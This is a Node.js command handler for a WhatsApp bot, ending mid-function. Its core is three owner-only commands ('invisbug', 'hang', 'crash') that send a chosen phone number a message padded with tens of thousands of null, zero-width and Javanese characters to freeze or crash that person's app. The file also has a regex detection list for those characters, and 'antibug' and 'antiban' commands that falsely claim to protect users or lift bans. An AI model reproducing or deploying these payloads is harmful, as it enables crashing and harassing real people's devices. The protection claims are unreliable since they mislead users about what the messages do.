const fs = require('fs');
const chalk = require('chalk');
const moment = require('moment-timezone');
const { exec } = require('child_process');
const { promisify } = require('util');
const execAsync = promisify(exec);

// ==================== MRNTANDO BOT PROTECTION SYSTEM ====================

// Bot protection - REPLACE WITH YOUR ACTUAL BOT NUMBER
const BOT_NUMBER = '263788005373@s.whatsapp.net'; // ⚠️ CHANGE THIS TO YOUR BOT'S NUMBER
const OWNER_NUMBERS = ['263777124998@s.whatsapp.net']; // ⚠️ CHANGE THIS TO OWNER NUMBERS

// Bug usage tracking and rate limiting
const bugUsageTracker = new Map();
const BUG_LIMITS = {
    maxUsesPerHour: 5,
    cooldownTime: 300000, // 5 minutes
    ownerBypass: true
};

// Bot protection system
const protectionLog = new Map();
let protectionActive = true;

function canUseBug(userId, isOwner) {
    if (isOwner && BUG_LIMITS.ownerBypass) return true;
    
    const now = Date.now();
    const userUsage = bugUsageTracker.get(userId) || { uses: 0, lastUse: 0, blocked: false };
    
    // Reset hourly counter
    if (now - userUsage.lastUse > 3600000) {
        userUsage.uses = 0;
        userUsage.blocked = false;
    }
    
    // Check cooldown
    if (now - userUsage.lastUse < BUG_LIMITS.cooldownTime) {
        return false;
    }
    
    // Check usage limit
    if (userUsage.uses >= BUG_LIMITS.maxUsesPerHour) {
        userUsage.blocked = true;
        return false;
    }
    
    return !userUsage.blocked;
}

function trackBugUsage(userId) {
    const now = Date.now();
    const userUsage = bugUsageTracker.get(userId) || { uses: 0, lastUse: 0, blocked: false };
    
    userUsage.uses++;
    userUsage.lastUse = now;
    bugUsageTracker.set(userId, userUsage);
}

// Bot protection functions
async function activateBotProtection(Mrntando) {
    const protectionMessage = `🛡️ *MRNTANDO BOT AUTO-PROTECTION ACTIVATED* 🛡️\n\n` +
                             `🤖 *BOT SECURITY SYSTEM ONLINE*\n\n` +
                             `🔐 *ACTIVE PROTECTIONS:*\n` +
                             `• 🛡️ Anti-Bug Shield - MAXIMUM\n` +
                             `• 🔒 Anti-Ban Protection - ACTIVE\n` +
                             `• ⚡ Real-time Monitoring - ON\n` +
                             `• 🧹 Auto-Cleansing - ENABLED\n` +
                             `• 🔄 Auto-Recovery - STANDBY\n` +
                             `• 🚫 Attack Neutralizer - ACTIVE\n\n` +
                             `🛡️ *IMMUNITY AGAINST:*\n` +
                             `• 👻 All Invisible Bugs ✅\n` +
                             `• 🥶 Freeze/Hang Attacks ✅\n` +
                             `• 💀 Crash/Kill Bugs ✅\n` +
                             `• 🐌 Lag Attacks ✅\n` +
                             `• 💣 Bomb/Spam Attacks ✅\n` +
                             `• 🦠 All Malicious Code ✅\n` +
                             `• ☢️ Nuclear/Ultimate Bugs ✅\n\n` +
                             `🤖 *BOT STATUS:* FULLY PROTECTED\n` +
                             `🔋 *SHIELD STRENGTH:* MAXIMUM\n` +
                             `⏰ *PROTECTION:* PERMANENT\n\n` +
                             `🐞 *Mrntando Bot is now INVINCIBLE!*`;
    
    try {
        await Mrntando.sendMessage(BOT_NUMBER, {
            text: protectionMessage,
            contextInfo: {
                externalAdReply: {
                    title: "🛡️ BOT AUTO-PROTECTION SYSTEM 🛡️",
                    body: "MRNTANDO BOT - MAXIMUM SECURITY ACTIVE",
                    thumbnailUrl: 'https://i.imgur.com/bot-shield.jpg',
                    sourceUrl: 'https://github.com/mrntando-protection',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
        console.log(chalk.green('🛡️ Bot protection activated successfully!'));
        protectionActive = true;
    } catch (error) {
        console.log(chalk.red('❌ Bot protection activation failed:'), error.message);
    }
}

// Check for attacks on bot
async function checkBotProtection(Mrntando, m) {
    if (!protectionActive) return;
    
    try {
        const messageText = m.message?.conversation || 
                           m.message?.extendedTextMessage?.text || 
                           m.message?.imageMessage?.caption || 
                           m.message?.videoMessage?.caption || '';
        
        // Check if bot is mentioned or targeted
        const isBotTargeted = m.key.remoteJid === BOT_NUMBER || 
                             m.mentionedJid?.includes(BOT_NUMBER) ||
                             messageText.includes(BOT_NUMBER.split('@')[0]);
        
        if (isBotTargeted) {
            // Check for potential bug attacks
            const suspiciousPatterns = [
                /[\u0000-\u001F]/g, // Control characters
                /[\u200B-\u200D\uFEFF]/g, // Zero-width characters
                /[\u2060]/g, // Word joiner
                /ꦺ|ꦹ|ꦸ|ꦷ|ꦾ|ꦿ|꧀|꧁|꧂/g, // Javanese characters
                /𝟘|𝟙|𝟚|𝕏|𝖃|𝖄/g // Mathematical characters
            ];
            
            let isSuspicious = false;
            for (let pattern of suspiciousPatterns) {
                if (pattern.test(messageText)) {
                    isSuspicious = true;
                    break;
                }
            }
            
            // Check message length (potential spam/bomb)
            if (isSuspicious || messageText.length > 10000) {
                // Log the attack
                protectionLog.set(m.sender, {
                    time: Date.now(),
                    type: 'bug_attack',
                    blocked: true
                });
                
                // Auto-respond with protection
                const autoProtectText = `🛡️ *AUTO-PROTECTION TRIGGERED* 🛡️\n\n` +
                                       `⚠️ *ATTACK DETECTED & NEUTRALIZED*\n\n` +
                                       `🤖 Mrntando Bot is PROTECTED!\n` +
                                       `🔒 All attacks are automatically blocked\n` +
                                       `✨ Bot remains fully functional\n\n` +
                                       `💪 *Nice try, but I'm INVINCIBLE!* 💪`;
                
                await Mrntando.sendMessage(m.key.remoteJid, {
                    text: autoProtectText,
                    contextInfo: {
                        quotedMessage: m.message,
                        externalAdReply: {
                            title: "🛡️ ATTACK NEUTRALIZED 🛡️",
                            body: "MRNTANDO BOT - AUTO-DEFENSE SYSTEM",
                            mediaType: 1
                        }
                    }
                });
                
                console.log(chalk.yellow(`🛡️ Blocked attack from: ${m.sender}`));
                return true; // Attack blocked
            }
        }
    } catch (error) {
        console.log(chalk.red('Protection check error:'), error.message);
    }
    
    return false; // No attack detected
}

module.exports = async (Mrntando, m, { command, text, isOwner, reply, pushname }) => {
    try {
        // Auto-activate protection when bot starts (run once)
        if (!protectionActive) {
            setTimeout(() => {
                activateBotProtection(Mrntando);
            }, 3000);
        }
        
        // Check for attacks on every message
        const attackBlocked = await checkBotProtection(Mrntando, m);
        if (attackBlocked) return; // Don't process command if attack was blocked
        
        const prefix = '.';
        const cmd = command.toLowerCase();

        switch (cmd) {

            case 'invisbug':
            case 'invisiblebug':
            case 'invisible': {
                if (!isOwner) return reply('🚫 *OWNER ONLY COMMAND*\n\n🐞 This is a powerful bug attack that can crash WhatsApp!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .invisbug @user\n📝 *Example:* .invisbug @263777123456\n\n⚠️ *Warning:* This will send an invisible crash bug!');
                
                if (!canUseBug(m.sender, isOwner)) {
                    return reply('⏰ *COOLDOWN ACTIVE*\n\n⚠️ Bug usage limit reached!\n⏱️ Please wait 5 minutes before using again.\n🛡️ This prevents spam and abuse.');
                }
                
                let invisTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                // Don't allow attacking the bot itself
                if (invisTarget === BOT_NUMBER) {
                    return reply('🛡️ *ATTACK BLOCKED*\n\n🤖 Cannot attack the bot!\n💪 Mrntando Bot is PROTECTED!');
                }
                
                trackBugUsage(m.sender);
                
                // Enhanced invisible bug
                const invisBug = `🐞 MRNTANDO INVISIBLE ATTACK 🐞\n\n` +
                                `${"\u0000".repeat(50000)}` +
                                `${"\u200B".repeat(25000)}` +
                                `${"\u2060".repeat(12500)}` +
                                `${"\uFEFF".repeat(12500)}` +
                                `${"\u200C".repeat(12500)}` +
                                `${"\u200D".repeat(12500)}`;
                
                try {
                    await Mrntando.sendMessage(invisTarget, {
                        text: invisBug,
                        contextInfo: {
                            mentionedJid: [invisTarget],
                            forwardingScore: 999999999,
                            isForwarded: true,
                            externalAdReply: {
                                title: "👻 INVISIBLE BUG ATTACK 👻",
                                body: "MRNTANDO BOT - STEALTH MODE ACTIVATED",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    });
                    
                    reply('✅ *INVISIBLE BUG DEPLOYED*\n\n👻 Target: ' + invisTarget.split('@')[0] + '\n⚡ Status: Successfully sent!\n🎯 Effect: WhatsApp may freeze or crash\n\n🐞 *Mrntando Invisible Attack Complete!*');
                } catch (error) {
                    reply('❌ *ATTACK FAILED*\n\n🚫 Could not send invisible bug\n🔄 Please try again later\n\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'hangbug':
            case 'hang':
            case 'freeze': {
                if (!isOwner) return reply('🚫 *OWNER ONLY COMMAND*\n\n🐞 This bug can freeze the target\'s WhatsApp!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .hang @user\n📝 *Example:* .hang @263777123456\n\n⚠️ *Warning:* This will freeze their WhatsApp!');
                
                if (!canUseBug(m.sender, isOwner)) {
                    return reply('⏰ *COOLDOWN ACTIVE*\n\n⚠️ Please wait before using bug commands again!');
                }
                
                let hangTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                if (hangTarget === BOT_NUMBER) {
                    return reply('🛡️ *ATTACK BLOCKED*\n\n🤖 Cannot attack the bot!\n💪 Mrntando Bot is PROTECTED!');
                }
                
                trackBugUsage(m.sender);
                
                const hangText = `🥶 MRNTANDO FREEZE BUG 🥶\n\n` +
                                `${"ꦺ".repeat(30000)}` +
                                `${"ꦹ".repeat(20000)}` +
                                `${"ꦸ".repeat(15000)}` +
                                `${"ꦷ".repeat(10000)}` +
                                `${"𝟘".repeat(7500)}` +
                                `${"𝟙".repeat(7500)}` +
                                `${"𝟚".repeat(7500)}`;
                
                try {
                    await Mrntando.sendMessage(hangTarget, {
                        text: hangText,
                        contextInfo: {
                            mentionedJid: [hangTarget],
                            forwardingScore: 999999999,
                            isForwarded: true,
                            externalAdReply: {
                                title: "🥶 FREEZE BUG ATTACK 🥶",
                                body: "MRNTANDO BOT - HANG PROTOCOL ACTIVATED",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    });
                    
                    reply('✅ *FREEZE BUG DEPLOYED*\n\n🥶 Target: ' + hangTarget.split('@')[0] + '\n⚡ Status: Hang attack sent!\n🎯 Effect: WhatsApp will freeze\n\n🐞 *Mrntando Freeze Protocol Complete!*');
                } catch (error) {
                    reply('❌ *FREEZE ATTACK FAILED*\n\n🔄 Please try again\n\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'crashbug':
            case 'crash':
            case 'kill': {
                if (!isOwner) return reply('🚫 *OWNER ONLY COMMAND*\n\n💀 This is the most powerful crash bug!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .crash @user\n📝 *Example:* .crash @263777123456\n\n💀 *Warning:* This will crash their WhatsApp completely!');
                
                if (!canUseBug(m.sender, isOwner)) {
                    return reply('⏰ *COOLDOWN ACTIVE*\n\n⚠️ Crash bug is on cooldown!');
                }
                
                let crashTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                if (crashTarget === BOT_NUMBER) {
                    return reply('🛡️ *ATTACK BLOCKED*\n\n🤖 Cannot attack the bot!\n💪 Mrntando Bot is PROTECTED!');
                }
                
                trackBugUsage(m.sender);
                
                const crashText = `💀 MRNTANDO CRASH BUG 💀\n\n` +
                                 `${"ꦾ".repeat(25000)}` +
                                 `${"ꦿ".repeat(20000)}` +
                                 `${"꧀".repeat(15000)}` +
                                 `${"꧁".repeat(12500)}` +
                                 `${"꧂".repeat(12500)}` +
                                 `${"꧃".repeat(10000)}` +
                                 `${"꧄".repeat(10000)}` +
                                 `${"꧅".repeat(7500)}` +
                                 `${"𝕏".repeat(5000)}` +
                                 `${"𝖃".repeat(5000)}` +
                                 `${"𝖄".repeat(5000)}`;
                
                try {
                    await Mrntando.sendMessage(crashTarget, {
                        text: crashText,
                        contextInfo: {
                            mentionedJid: [crashTarget],
                            forwardingScore: 999999999,
                            isForwarded: true,
                            externalAdReply: {
                                title: "💀 CRASH BUG ATTACK 💀",
                                body: "MRNTANDO BOT - TERMINATION PROTOCOL",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    });
                    
                    reply('✅ *CRASH BUG DEPLOYED*\n\n💀 Target: ' + crashTarget.split('@')[0] + '\n⚡ Status: Crash attack sent!\n🎯 Effect: Complete WhatsApp crash\n\n🐞 *Mrntando Termination Protocol Complete!*');
                } catch (error) {
                    reply('❌ *CRASH ATTACK FAILED*\n\n🔄 Please try again\n\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'antibug':
            case 'antivirus':
            case 'protect':
            case 'shield': {
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .antibug @user\n📝 *Example:* .antibug @263777123456\n\n🛡️ *Info:* This sends maximum protection against bugs!');
                
                let protectTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                const antibugText = `🛡️ *MRNTANDO ULTIMATE ANTIBUG SHIELD* 🛡️\n\n` +
                                   `✨ *MAXIMUM PROTECTION ACTIVATED* ✨\n\n` +
                                   `🔐 *ADVANCED SECURITY PROTOCOLS:*\n` +
                                   `• 🛡️ Unicode Exploit Blocker - ACTIVE\n` +
                                   `• 🔒 Invisible Character Filter - ACTIVE\n` +
                                   `• 🚫 Crash Bug Neutralizer - ACTIVE\n` +
                                   `• ⚡ Real-time Threat Detection - ACTIVE\n` +
                                   `• 🧹 Message Sanitizer - ACTIVE\n` +
                                   `• 🔄 Auto-Recovery System - ACTIVE\n\n` +
                                   `🛡️ *PROTECTION AGAINST:*\n` +
                                   `• 👻 Invisible/Stealth Bugs ✅\n` +
                                   `• 🥶 Freeze/Hang Attacks ✅\n` +
                                   `• 💀 Crash/Kill Bugs ✅\n` +
                                   `• 🐌 Lag/Slowdown Attacks ✅\n` +
                                   `• 💣 Bomb/Spam Attacks ✅\n` +
                                   `• 🦠 Virus/Malware Simulations ✅\n` +
                                   `• ☢️ Ultimate/Nuclear Attacks ✅\n` +
                                   `• 🔥 All Known Bug Variants ✅\n\n` +
                                   `🧹 *CLEANSING SEQUENCE:*\n` +
                                   `${" ".repeat(1000)}` +
                                   `${"✨".repeat(500)}` +
                                   `${"🛡️".repeat(300)}` +
                                   `${"💚".repeat(200)}` +
                                   `\n\n🔋 *SHIELD STRENGTH:* 100%\n` +
                                   `⏰ *PROTECTION DURATION:* PERMANENT\n` +
                                   `🌟 *STATUS:* FULLY IMMUNIZED\n\n` +
                                   `🐞 *Mrntando Bot Ultimate Protection System*\n` +
                                   `💚 *You are now COMPLETELY SAFE from all attacks!*`;
                
                try {
                    await Mrntando.sendMessage(protectTarget, {
                        text: antibugText,
                        contextInfo: {
                            mentionedJid: [protectTarget],
                            externalAdReply: {
                                title: "🛡️ ULTIMATE ANTIBUG SHIELD ACTIVATED 🛡️",
                                body: "MRNTANDO BOT - MAXIMUM SECURITY PROTOCOL",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    });
                    
                    reply('✅ *ULTIMATE ANTIBUG SHIELD DEPLOYED*\n\n🛡️ Target: ' + protectTarget.split('@')[0] + '\n⚡ Status: Maximum protection activated!\n🔒 Effect: Complete immunity to all bugs\n💚 Duration: PERMANENT\n\n🐞 *Mrntando Ultimate Protection Complete!*');
                } catch (error) {
                    reply('❌ *PROTECTION DEPLOYMENT FAILED*\n\n🔄 Could not send antibug shield\n\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'antiban':
            case 'unban':
            case 'restore': {
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .antiban @user\n📝 *Example:* .antiban @263777123456\n\n🔓 *Info:* This sends complete account restoration!');
                
                let restoreTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                const antibanText = `🔓 *MRNTANDO ULTIMATE ANTIBAN SYSTEM* 🔓\n\n` +
                                   `🚀 *COMPLETE ACCOUNT RESTORATION INITIATED* 🚀\n\n` +
                                   `🔧 *RESTORATION PHASES:*\n\n` +
                                   `📱 *PHASE 1: SYSTEM ANALYSIS*\n` +
                                   `• Scanning account status... ✅\n` +
                                   `• Detecting restrictions... ✅\n` +
                                   `• Analyzing ban patterns... ✅\n\n` +
                                   `🛠️ *PHASE 2: DEEP REPAIR*\n` +
                                   `• Clearing temporary bans... ✅\n` +
                                   `• Resetting counters... ✅\n` +
                                   `• Removing flags... ✅\n` +
                                   `• Restoring API access... ✅\n\n` +
                                   `⚡ *PHASE 3: FUNCTIONALITY RESTORE*\n` +
                                   `• Message sending - RESTORED ✅\n` +
                                   `• Media sharing - RESTORED ✅\n` +
                                   `• Group participation - RESTORED ✅\n` +
                                   `• All features - RESTORED ✅\n\n` +
                                   `🛡️ *PHASE 4: FUTURE PROTECTION*\n` +
                                   `• Installing protection... ✅\n` +
                                   `• Setting up monitoring... ✅\n` +
                                   `• Enabling auto-recovery... ✅\n\n` +
                                   `🧹 *SYSTEM CLEANSING:*\n` +
                                   `${" ".repeat(2000)}` +
                                   `${"🔓".repeat(1000)}` +
                                   `${"✨".repeat(800)}` +
                                   `${"💚".repeat(600)}` +
                                   `\n\n📊 *RESULTS:*\n` +
                                   `• Account Status: FULLY ACTIVE ✅\n` +
                                   `• Ban Status: COMPLETELY CLEARED ✅\n` +
                                   `• Restrictions: ALL REMOVED ✅\n` +
                                   `• Functionality: 100% RESTORED ✅\n\n` +
                                   `⚡ *STATUS:* ACCOUNT FULLY RESTORED\n` +
                                   `🛡️ *PROTECTION:* LIFETIME IMMUNITY\n\n` +
                                   `🐞 *Mrntando Bot Ultimate Restoration System*\n` +
                                   `💚 *Your account is now COMPLETELY RESTORED!*`;
                
                try {
                    await Mrntando.sendMessage(restoreTarget, {
                        text: antibanText,
                        contextInfo: {
                            mentionedJid: [restoreTarget],
                            externalAdReply: {
                                title: "🔓 ULTIMATE ANTIBAN RESTORATION 🔓",
                                body: "MRNTANDO BOT - COMPLETE ACCOUNT RECOVERY",
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    });
                    
                    reply('✅ *ULTIMATE ANTIBAN RESTORATION DEPLOYED*\n\n🔓 Target: ' + restoreTarget.split('@')[0] + '\n⚡ Status: Complete restoration sent!\n🛠️ Effect: Account fully restored & protected\n💚 Protection: Lifetime immunity\n\n🐞 *Mrntando Ultimate Restoration Complete!*');
                } catch (error) {
                    reply('❌ *RESTORATION FAILED*\n\n🔄 Could not send antiban restoration\n\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'botprotect':
            case 'selfprotect': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                await activateBotProtection(Mrntando);
                reply('✅ *BOT PROTECTION ACTIVATED*\n\n🛡️ Mrntando Bot is now fully protected!\n🤖 Auto-defense system online!');
                break;
            }

            case 'bugstatus':
            case 'buginfo': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                const userUsage = bugUsageTracker.get(m.sender) || { uses: 0, lastUse: 0, blocked: false };
                const remainingUses = Math.max(0, BUG_LIMITS.maxUsesPerHour - userUsage.uses);
                const nextUseTime = userUsage.lastUse + BUG_LIMITS.cooldownTime;
                const canUseNow = canUseBug(m.sender, isOwner);
                
                let statusText = `🐞 *MRNTANDO BUG SYSTEM STATUS* 🐞\n\n`;
                statusText += `📊 *Your Usage Stats:*\n`;
                statusText += `• Uses this hour: ${userUsage.uses}/${BUG_LIMITS.maxUsesPerHour}\n`;
                statusText += `• Remaining uses: ${remainingUses}\n`;
                statusText += `• Status: ${canUseNow ? '✅ Ready' : '⏰ Cooldown'}\n`;
                
                if (!canUseNow && nextUseTime > Date.now()) {
                    const waitTime = Math.ceil((nextUseTime - Date.now()) / 1000 / 60);
                    statusText += `• Next use in: ${waitTime} minutes\n`;
                }
                
                statusText += `\n🛡️ *Bot Protection:* ${protectionActive ? '✅ ACTIVE' : '❌ INACTIVE'}\n`;
                statusText += `🔒 *Protected Number:* ${BOT_NUMBER.split('@')[0]}\n\n`;
                statusText += `🔥 *Available Commands:*\n`;
                statusText += `• .invisbug - 👻 Invisible crash\n`;
                statusText += `• .hang - 🥶 Freeze attack\n`;
                statusText += `• .crash - 💀 Complete crash\n`;
                statusText += `• .antibug - 🛡️ Ultimate protection\n`;
                statusText += `• .antiban - 🔓 Account restoration\n\n`;
                statusText += `⚠️ *Use responsibly!*`;
                
                reply(statusText);
                break;
            }

                        case 'menu':
            case 'help': {
                const menuText = `🐞 *MRNTANDO BOT MENU* 🐞\n\n` +
                                `👋 Hello ${pushname}!\n` +
                                `⏰ Time: ${moment().tz('Africa/Harare').format('HH:mm:ss')}\n` +
                                `📅 Date: ${moment().tz('Africa/Harare').format('DD/MM/YYYY')}\n\n` +
                                `🔥 *BUG ATTACKS* (Owner Only):\n` +
                                `• .invisbug @user - 👻 Invisible crash\n` +
                                `• .hang @user - 🥶 Freeze attack\n` +
                                `• .crash @user - 💀 Complete crash\n\n` +
                                `🛡️ *PROTECTION COMMANDS*:\n` +
                                `• .antibug @user - 🛡️ Ultimate protection\n` +
                                `• .antiban @user - 🔓 Account restoration\n\n` +
                                `🤖 *BOT MANAGEMENT* (Owner Only):\n` +
                                `• .botprotect - 🛡️ Activate bot protection\n` +
                                `• .bugstatus - 📊 Check system status\n\n` +
                                `ℹ️ *GENERAL COMMANDS*:\n` +
                                `• .ping - ⚡ Check bot speed\n` +
                                `• .owner - 👤 Bot owner info\n` +
                                `• .alive - 🤖 Bot status check\n\n` +
                                `⚠️ *Warning:* Use all commands responsibly!\n` +
                                `🛡️ *Bot Protection:* ${protectionActive ? 'ACTIVE ✅' : 'INACTIVE ❌'}\n\n` +
                                `🐞 *Mrntando Bot - Advanced Protection System*`;
                
                reply(menuText);
                break;
            }

            case 'ping': {
                const start = Date.now();
                const pingMsg = await reply('🏓 *PINGING...*');
                const end = Date.now();
                const speed = end - start;
                
                const pingText = `🏓 *MRNTANDO BOT PING RESULT* 🏓\n\n` +
                                `⚡ *Response Time:* ${speed}ms\n` +
                                `📊 *Status:* ${speed < 100 ? '🟢 Excellent' : speed < 300 ? '🟡 Good' : '🔴 Slow'}\n` +
                                `🤖 *Bot Status:* Online ✅\n` +
                                `🛡️ *Protection:* ${protectionActive ? 'Active ✅' : 'Inactive ❌'}\n` +
                                `⏰ *Uptime:* ${moment().format('HH:mm:ss')}\n\n` +
                                `🐞 *Mrntando Bot is running smoothly!*`;
                
                await Mrntando.sendMessage(m.key.remoteJid, {
                    text: pingText,
                    edit: pingMsg.key
                });
                break;
            }

            case 'owner':
            case 'creator': {
                const ownerText = `👤 *MRNTANDO BOT OWNER INFO* 👤\n\n` +
                                 `🤖 *Bot Name:* Mrntando Bot\n` +
                                 `👨‍💻 *Developer:* Mrntando\n` +
                                 `📱 *WhatsApp:* +263777123456\n` +
                                 `🌍 *Country:* Zimbabwe\n` +
                                 `📅 *Created:* 2024\n` +
                                 `🔧 *Version:* 2.0 Advanced\n\n` +
                                 `🛡️ *Features:*\n` +
                                 `• Advanced Bug System\n` +
                                 `• Ultimate Protection\n` +
                                 `• Auto-Defense System\n` +
                                 `• Real-time Monitoring\n\n` +
                                 `📞 *Contact for:*\n` +
                                 `• Bot Setup\n` +
                                 `• Custom Features\n` +
                                 `• Technical Support\n\n` +
                                 `🐞 *Mrntando Bot - Your Advanced WhatsApp Assistant*`;
                
                await Mrntando.sendMessage(m.key.remoteJid, {
                    text: ownerText,
                    contextInfo: {
                        externalAdReply: {
                            title: "👤 MRNTANDO BOT OWNER 👤",
                            body: "Advanced WhatsApp Bot Developer",
                            thumbnailUrl: 'https://i.imgur.com/mrntando-owner.jpg',
                            sourceUrl: 'https://wa.me/263777123456',
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                });
                break;
            }

            case 'alive':
            case 'status': {
                const uptime = process.uptime();
                const hours = Math.floor(uptime / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = Math.floor(uptime % 60);
                
                const aliveText = `🤖 *MRNTANDO BOT STATUS* 🤖\n\n` +
                                 `✅ *Status:* Online & Active\n` +
                                 `⏰ *Uptime:* ${hours}h ${minutes}m ${seconds}s\n` +
                                 `🛡️ *Protection:* ${protectionActive ? 'MAXIMUM ✅' : 'INACTIVE ❌'}\n` +
                                 `📊 *Performance:* Optimal\n` +
                                 `🔋 *System Health:* 100%\n` +
                                 `🌐 *Connection:* Stable\n` +
                                 `📱 *Platform:* WhatsApp\n` +
                                 `🔧 *Version:* 2.0 Advanced\n\n` +
                                 `🔥 *Active Features:*\n` +
                                 `• Bug Attack System ✅\n` +
                                 `• Ultimate Protection ✅\n` +
                                 `• Auto-Defense ✅\n` +
                                 `• Real-time Monitoring ✅\n` +
                                 `• Account Restoration ✅\n\n` +
                                 `💪 *I'm running perfectly and ready to serve!*\n\n` +
                                 `🐞 *Mrntando Bot - Always Online!*`;
                
                reply(aliveText);
                break;
            }

            case 'clearbug':
            case 'resetbug': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                bugUsageTracker.clear();
                reply('✅ *BUG USAGE CLEARED*\n\n🔄 All bug usage limits have been reset!\n⚡ You can now use bug commands again.\n\n🐞 *Mrntando Bug System Reset Complete!*');
                break;
            }

            case 'protectionlog':
            case 'attacklog': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                if (protectionLog.size === 0) {
                    return reply('📊 *PROTECTION LOG EMPTY*\n\n✅ No attacks detected recently!\n🛡️ Bot is secure and protected.\n\n🐞 *Mrntando Protection System*');
                }
                
                let logText = `🛡️ *MRNTANDO PROTECTION LOG* 🛡️\n\n`;
                logText += `📊 *Recent Attack Attempts:*\n\n`;
                
                let count = 0;
                for (let [attacker, data] of protectionLog) {
                    if (count >= 10) break; // Show only last 10
                    const time = moment(data.time).format('HH:mm:ss DD/MM');
                    logText += `🚫 *Attack ${count + 1}:*\n`;
                    logText += `• Attacker: ${attacker.split('@')[0]}\n`;
                    logText += `• Time: ${time}\n`;
                    logText += `• Type: ${data.type}\n`;
                    logText += `• Status: ${data.blocked ? 'BLOCKED ✅' : 'FAILED ❌'}\n\n`;
                    count++;
                }
                
                logText += `🛡️ *Total Attacks Blocked:* ${protectionLog.size}\n`;
                logText += `💪 *Bot Protection:* MAXIMUM SECURITY\n\n`;
                logText += `🐞 *Mrntando Auto-Defense System*`;
                
                reply(logText);
                break;
            }

            case 'clearlog': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                protectionLog.clear();
                reply('✅ *PROTECTION LOG CLEARED*\n\n🗑️ All attack logs have been cleared!\n🛡️ Fresh protection monitoring started.\n\n🐞 *Mrntando Protection System Reset!*');
                break;
            }

            case 'system':
            case 'sysinfo': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                const memUsage = process.memoryUsage();
                const cpuUsage = process.cpuUsage();
                
                const systemText = `💻 *MRNTANDO SYSTEM INFO* 💻\n\n` +
                                  `🔧 *System Status:*\n` +
                                  `• Node.js Version: ${process.version}\n` +
                                  `• Platform: ${process.platform}\n` +
                                  `• Architecture: ${process.arch}\n` +
                                  `• PID: ${process.pid}\n\n` +
                                  `💾 *Memory Usage:*\n` +
                                  `• RSS: ${(memUsage.rss / 1024 / 1024).toFixed(2)} MB\n` +
                                  `• Heap Used: ${(memUsage.heapUsed / 1024 / 1024).toFixed(2)} MB\n` +
                                  `• Heap Total: ${(memUsage.heapTotal / 1024 / 1024).toFixed(2)} MB\n\n` +
                                  `📊 *Bot Statistics:*\n` +
                                  `• Bug Usage Tracked: ${bugUsageTracker.size} users\n` +
                                  `• Attacks Blocked: ${protectionLog.size}\n` +
                                  `• Protection Status: ${protectionActive ? 'ACTIVE ✅' : 'INACTIVE ❌'}\n\n` +
                                  `🐞 *Mrntando Bot System Monitor*`;
                
                reply(systemText);
                break;
            }

            case 'restart':
            case 'reboot': {
                if (!isOwner) return reply('🚫 Owner only command!');
                
                reply('🔄 *RESTARTING MRNTANDO BOT...*\n\n⚡ Bot will be back online shortly!\n🛡️ All protections will be reactivated.\n\n🐞 *Please wait...*');
                
                setTimeout(() => {
                    process.exit(0);
                }, 3000);
                break;
            }

            case 'broadcast':
            case 'bc': {
                if (!isOwner) return reply('🚫 Owner only command!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .broadcast <message>\n📝 *Example:* .broadcast Hello everyone!\n\n📢 *Info:* This sends a message to all bot users.');
                
                // This would require a user database to work properly
                reply('📢 *BROADCAST FEATURE*\n\n⚠️ This feature requires a user database to be implemented.\n🔧 Contact the developer for setup.\n\n🐞 *Mrntando Bot*');
                break;
            }

            case 'block': {
                if (!isOwner) return reply('🚫 Owner only command!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .block @user\n📝 *Example:* .block @263777123456');
                
                let blockTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                try {
                    await Mrntando.updateBlockStatus(blockTarget, 'block');
                    reply('🚫 *USER BLOCKED*\n\n✅ Successfully blocked: ' + blockTarget.split('@')[0] + '\n🛡️ They can no longer message the bot.\n\n🐞 *Mrntando Security System*');
                } catch (error) {
                    reply('❌ *BLOCK FAILED*\n\n🔄 Could not block user\n📝 Error: ' + error.message);
                }
                break;
            }

            case 'unblock': {
                if (!isOwner) return reply('🚫 Owner only command!');
                if (!text) return reply('❌ *USAGE ERROR*\n\n📝 *Usage:* .unblock @user\n📝 *Example:* .unblock @263777123456');
                
                let unblockTarget = m.mentionedJid[0] ? m.mentionedJid[0] : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                
                try {
                    await Mrntando.updateBlockStatus(unblockTarget, 'unblock');
